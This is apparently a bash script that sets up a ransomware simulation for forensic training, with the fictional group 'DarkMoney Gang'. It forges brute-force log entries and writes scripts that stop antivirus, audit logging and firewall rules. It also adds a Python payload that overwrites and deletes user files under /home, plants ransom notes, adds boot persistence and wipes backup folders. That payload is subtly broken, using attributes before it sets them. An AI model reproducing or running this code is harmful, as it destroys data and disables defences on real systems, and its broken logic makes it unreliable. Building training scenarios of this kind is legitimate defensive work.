#!/bin/bash

# Ransomware Attack Simulation
# Simulates a realistic ransomware deployment and execution

echo "[RANSOMWARE SIMULATION] Deploying ransomware attack scenario..."

RANSOMWARE_NAME="CryptoVault"
RANSOMWARE_GROUP="DarkMoney Gang"
BITCOIN_ADDRESS="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"

# 1. Initial Access via RDP Brute Force
echo "  [1] Simulating RDP brute force attack..."
for i in {1..25}; do
    logger -p auth.warning "systemd-logind: Failed to create session: Authentication failure"
    logger -p auth.warning "sshd[$(shuf -i 2000-9999 -n 1)]: Failed password for administrator from 185.220.101.$(shuf -i 1-254 -n 1) port $(shuf -i 50000-65000 -n 1) ssh2"
done

# Successful RDP/SSH compromise
logger -p auth.info "sshd[3847]: Accepted password for administrator from 185.220.101.42 port 54728 ssh2"

# 2. Disable Security Software
echo "  [2] Disabling security mechanisms..."
mkdir -p /tmp/.security_disable
cat << 'EOF' > /tmp/.security_disable/disable_av.sh
#!/bin/bash
# Disable common security tools
systemctl stop clamav-daemon 2>/dev/null || true
systemctl disable clamav-daemon 2>/dev/null || true
systemctl stop rkhunter 2>/dev/null || true
systemctl stop fail2ban 2>/dev/null || true
killall -9 chkrootkit 2>/dev/null || true

# Disable logging
systemctl stop rsyslog 2>/dev/null || true
systemctl stop auditd 2>/dev/null || true

# Clear iptables rules
iptables -F 2>/dev/null || true
iptables -X 2>/dev/null || true
EOF
chmod +x /tmp/.security_disable/disable_av.sh

# 3. Network Discovery and Mapping
echo "  [3] Performing network reconnaissance..."
mkdir -p /tmp/.recon
cat << 'EOF' > /tmp/.recon/network_discovery.txt
# Network Discovery Results for Lateral Movement
192.168.1.10 - DC01.CORP.LOCAL (Domain Controller) - Ports: 53,88,135,139,389,445,636,3268,3269
192.168.1.15 - FILE01.CORP.LOCAL (File Server) - Ports: 22,135,139,445
192.168.1.20 - DB01.CORP.LOCAL (Database Server) - Ports: 1433,3306,5432
192.168.1.25 - WEB01.CORP.LOCAL (Web Server) - Ports: 80,443,8080
192.168.1.30 - BACKUP01.CORP.LOCAL (Backup Server) - Ports: 22,873,8006
192.168.1.35 - MAIL01.CORP.LOCAL (Mail Server) - Ports: 25,110,143,993,995
EOF

# 4. Credential Dumping
echo "  [4] Dumping credentials for lateral movement..."
mkdir -p /tmp/.creds/ransomware
cat << 'EOF' > /tmp/.creds/ransomware/extracted_creds.txt
# Extracted Credentials for Lateral Movement
CORP\administrator:P@ssw0rd123!
CORP\backup_admin:BackupService2024
CORP\sql_service:MyS3cur3P@ssw0rd
CORP\file_admin:FileServer@2024
CORP\web_service:WebApp!2024
CORP\mail_admin:ExchangeP@ss2024

# Service Account Tickets (Kerberoasting results)
CORP\svc_web:MyWebServicePassword
CORP\svc_backup:BackupSvc2024!
CORP\svc_database:DbService@Pass
EOF

# 5. Lateral Movement Tools Deployment
echo "  [5] Deploying lateral movement tools..."
mkdir -p /tmp/.lateral
cat << 'EOF' > /tmp/.lateral/wmi_exec.py
#!/usr/bin/env python3
# WMI Execution for Lateral Movement
import sys

def wmi_execute(target, username, password, command):
    print(f"[WMI] Connecting to {target}")
    print(f"[WMI] Using credentials: {username}")
    print(f"[WMI] Executing: {command}")
    # Simulated WMI execution
    return True

if __name__ == "__main__":
    targets = [
        "192.168.1.10",  # DC01
        "192.168.1.15",  # FILE01
        "192.168.1.20",  # DB01
        "192.168.1.25",  # WEB01
        "192.168.1.30",  # BACKUP01
    ]
    
    for target in targets:
        wmi_execute(target, "administrator", "P@ssw0rd123!", "powershell.exe -enc <base64_payload>")
EOF

# 6. Ransomware Payload Deployment
echo "  [6] Creating ransomware payload..."
mkdir -p /tmp/.ransomware
cat << 'EOF' > /tmp/.ransomware/cryptovault.py
#!/usr/bin/env python3
"""
CryptoVault Ransomware - Educational Simulation
WARNING: This is a simulation for forensic training purposes only
"""

import os
import base64
from datetime import datetime, timedelta

class CryptoVault:
    def __init__(self):
        self.ransom_note = """
╔══════════════════════════════════════════════════════════════╗
║                          CRYPTOVAULT                         ║
║                      Your files are encrypted               ║
╚══════════════════════════════════════════════════════════════╝

What happened to your files?
All your important files have been encrypted with AES-256 encryption.
This includes documents, photos, videos, databases, and other files.

How to recover your files?
The only way to decrypt your files is with our decryption software.
You cannot decrypt your files without our private key.

Payment Instructions:
1. Purchase Bitcoin worth $5000 USD
2. Send Bitcoin to: """ + self.bitcoin_address + """
3. Email your Bitcoin transaction ID to: recovery@darkmail.onion
4. You will receive decryption software within 24 hours

Important Notes:
- You have 72 hours to make payment
- After 72 hours, the decryption key will be deleted
- Do not restart your computer or files may be lost forever
- Do not contact law enforcement or pay will double
- Do not try to decrypt files yourself or they will be corrupted

Contact us: recovery@darkmail.onion (Use Tor Browser)
Your ID: """ + self.infection_id + """

DarkMoney Gang - Professional Data Recovery Services
        """
        
        self.bitcoin_address = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        self.infection_id = "CORP-" + datetime.now().strftime("%Y%m%d-%H%M%S")
        
    def encrypt_files(self):
        """Simulate file encryption process"""
        target_extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.zip', '.sql']
        encrypted_count = 0
        
        for root, dirs, files in os.walk('/home'):
            for file in files:
                if any(file.endswith(ext) for ext in target_extensions):
                    original_path = os.path.join(root, file)
                    encrypted_path = original_path + '.cryptovault'
                    
                    try:
                        # Simulate encryption by replacing content
                        with open(original_path, 'rb') as f:
                            data = f.read()
                        
                        encrypted_data = base64.b64encode(b"ENCRYPTED_BY_CRYPTOVAULT_" + data[:100])
                        
                        with open(encrypted_path, 'wb') as f:
                            f.write(encrypted_data)
                        
                        os.remove(original_path)
                        encrypted_count += 1
                        
                    except Exception as e:
                        continue
        
        return encrypted_count
    
    def deploy_ransom_notes(self):
        """Deploy ransom notes across the system"""
        note_locations = [
            '/home/webadmin/Desktop/README_DECRYPT.txt',
            '/tmp/README_DECRYPT.txt',
            '/var/www/html/README_DECRYPT.txt',
            '/etc/README_DECRYPT.txt'
        ]
        
        for location in note_locations:
            try:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                with open(location, 'w') as f:
                    f.write(self.ransom_note)
            except:
                continue
    
    def create_persistence(self):
        """Create persistence mechanisms"""
        # Autostart ransomware on boot
        autostart_script = f"""#!/bin/bash
# CryptoVault Persistence
python3 /tmp/.ransomware/cryptovault.py --check-payment
"""
        
        with open('/etc/init.d/system-check', 'w') as f:
            f.write(autostart_script)
        os.chmod('/etc/init.d/system-check', 0o755)
    
    def establish_c2_communication(self):
        """Establish command and control communication"""
        c2_config = {
            'c2_server': 'tor://darkransomware.onion',
            'backup_c2': 'http://185.220.101.42:8080',
            'victim_id': self.infection_id,
            'encryption_key_id': 'KEY-' + datetime.now().strftime("%Y%m%d%H%M%S"),
            'infection_time': datetime.now().isoformat(),
            'deadline': (datetime.now() + timedelta(hours=72)).isoformat()
        }
        
        with open('/tmp/.ransomware/c2_config.json', 'w') as f:
            import json
            json.dump(c2_config, f, indent=2)

if __name__ == "__main__":
    print("[CRYPTOVAULT] Initializing encryption process...")
    ransomware = CryptoVault()
    
    print("[CRYPTOVAULT] Establishing C2 communication...")
    ransomware.establish_c2_communication()
    
    print("[CRYPTOVAULT] Encrypting files...")
    encrypted_files = ransomware.encrypt_files()
    
    print("[CRYPTOVAULT] Deploying ransom notes...")
    ransomware.deploy_ransom_notes()
    
    print("[CRYPTOVAULT] Creating persistence...")
    ransomware.create_persistence()
    
    print(f"[CRYPTOVAULT] Encryption complete! {encrypted_files} files encrypted")
    print(f"[CRYPTOVAULT] Victim ID: {ransomware.infection_id}")
EOF

# 7. Shadow Copy Deletion (Volume Shadow Service attack)
echo "  [7] Simulating shadow copy deletion..."
cat << 'EOF' > /tmp/.ransomware/shadow_delete.sh
#!/bin/bash
# Delete shadow copies and backups to prevent recovery
echo "Deleting shadow copies and backups..."

# Simulate shadow copy deletion commands (Linux equivalent)
find /var/backups -name "*.backup" -delete 2>/dev/null || true
find /home -name ".backup" -type d -exec rm -rf {} \; 2>/dev/null || true

# Delete common backup locations
rm -rf /backup/* 2>/dev/null || true
rm -rf /var/lib/mysql/backup/* 2>/dev/null || true
rm -rf /tmp/backup* 2>/dev/null || true

# Clear recycle bin equivalent
rm -rf /home/*/.local/share/Trash/* 2>/dev/null || true

echo "Shadow copies and backups deleted"
EOF

# 8. Network Share Encryption
echo "  [8] Setting up network share encryption..."
mkdir -p /tmp/.network_shares
cat << 'EOF' > /tmp/.network_shares/share_targets.txt
# Network Shares Targeted for Encryption
\\192.168.1.15\shared_documents
\\192.168.1.15\projects
\\192.168.1.20\database_backups
\\192.168.1.30\company_backups
\\192.168.1.25\web_content
\\192.168.1.10\SYSVOL
\\192.168.1.10\NETLOGON
EOF

# 9. Wallpaper and Desktop Modification
echo "  [9] Modifying desktop environment..."
cat << 'EOF' > /tmp/.ransomware/wallpaper_changer.sh
#!/bin/bash
# Change desktop wallpaper to ransom note
mkdir -p /tmp/.ransomware/wallpaper

cat << 'WALL_EOF' > /tmp/.ransomware/wallpaper/ransom_wallpaper.txt
╔══════════════════════════════════════════════════════════════╗
║                          CRYPTOVAULT                         ║
║                    ALL FILES ENCRYPTED                       ║
║                                                              ║
║              READ README_DECRYPT.txt FOR PAYMENT             ║
║                        INSTRUCTIONS                          ║
║                                                              ║
║                    72 HOURS REMAINING                        ║
║                                                              ║
║               DarkMoney Gang - Recovery Services             ║
╚══════════════════════════════════════════════════════════════╝
WALL_EOF

# Set as desktop background (simulation)
cp /tmp/.ransomware/wallpaper/ransom_wallpaper.txt /home/webadmin/Desktop/
EOF

# 10. Exfiltration Before Encryption
echo "  [10] Simulating data exfiltration before encryption..."
mkdir -p /tmp/.exfil/pre_encrypt
cat << 'EOF' > /tmp/.exfil/pre_encrypt/stolen_data.txt
# Data Exfiltrated Before Encryption (Double Extortion)
/home/webadmin/Documents/financial_reports.xlsx
/home/webadmin/Documents/customer_database.sql
/home/webadmin/Documents/employee_records.csv
/home/webadmin/Documents/contracts/vendor_agreements.pdf
/home/webadmin/Documents/backup/system_passwords.txt
/var/www/html/admin/user_data.json

# Sensitive Data Categories Stolen:
- Financial records and reports
- Customer personal information  
- Employee data and HR records
- Legal contracts and agreements
- System credentials and passwords
- Business intelligence data
EOF

# 11. Threat Actor Attribution Artifacts
echo "  [11] Creating threat actor artifacts..."
mkdir -p /tmp/.attribution
cat << 'EOF' > /tmp/.attribution/darkmoney_gang.txt
# DarkMoney Gang Threat Profile
Group: DarkMoney Gang
Active Since: 2023
Primary Motivation: Financial gain
Operating Model: Ransomware-as-a-Service (RaaS)
Target Industries: Healthcare, Manufacturing, Finance, Government
Average Ransom Demand: $50,000 - $5,000,000 USD

Known TTPs:
- RDP brute force attacks
- Email phishing campaigns  
- Supply chain compromises
- Double extortion (data theft + encryption)
- Fast deployment (2-4 hours from initial access)
- Professional negotiation process
- Custom ransomware variants

Infrastructure:
- Tor-based C2 communication
- Compromised VPS networks
- Bulletproof hosting services
- Cryptocurrency payment processing

Known Affiliates:
- Initial Access Brokers
- Credential sellers
- Money laundering services
EOF

echo "[RANSOMWARE SIMULATION] $RANSOMWARE_NAME deployment complete!"
echo ""
echo "RANSOMWARE: $RANSOMWARE_NAME"
echo "THREAT GROUP: $RANSOMWARE_GROUP"
echo "BITCOIN ADDRESS: $BITCOIN_ADDRESS"
echo "INFECTION TIMELINE: 72 hours"
echo ""
echo "Simulated Attack Chain:"
echo "  1. Initial Access via RDP Brute Force"
echo "  2. Security Software Disabling" 
echo "  3. Network Discovery and Mapping"
echo "  4. Credential Dumping"
echo "  5. Lateral Movement"
echo "  6. Data Exfiltration (Double Extortion)"
echo "  7. Shadow Copy Deletion"
echo "  8. File Encryption"
echo "  9. Ransom Note Deployment"
echo "  10. Persistence Establishment"
echo ""
echo "MITRE ATT&CK TTPs Simulated:"
echo "  - T1110.001: Password Brute Force"
echo "  - T1562.001: Disable Security Tools" 
echo "  - T1018: Remote System Discovery"
echo "  - T1003: OS Credential Dumping"
echo "  - T1021: Remote Services"
echo "  - T1041: Exfiltration Over C2"
echo "  - T1490: Inhibit System Recovery"
echo "  - T1486: Data Encrypted for Impact"
echo "  - T1491: Defacement"
echo "  - T1543: Create or Modify System Process"